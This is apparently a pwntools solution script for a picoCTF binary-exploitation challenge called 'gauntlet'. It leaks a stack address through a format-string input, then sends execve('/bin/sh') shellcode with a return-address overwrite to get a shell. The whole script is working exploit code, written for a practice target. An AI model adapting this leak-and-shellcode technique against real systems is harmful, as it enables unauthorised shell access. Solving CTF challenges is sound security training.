#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  59172
HOST = "wily-courier.picoctf.net"
exe = context.binary = ELF('./gauntlet', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.sendline(b"%6$p||")

stack_leak = int(p.recvuntil(b"||", drop = True), 16) - 0x158
log.info("stack_leak: " + hex(stack_leak))


sc = asm('''
    xor rsi, rsi
    xor rdx, rdx
    push rsi 
    
    mov rbx, 0x68732f2f6e69622f 
    push rbx
    mov rdi, rsp
    push 0x3b
    pop rax
    syscall
''', arch='amd64')

p.sendline(sc.ljust(120, b'A') + p64(stack_leak))

p.interactive()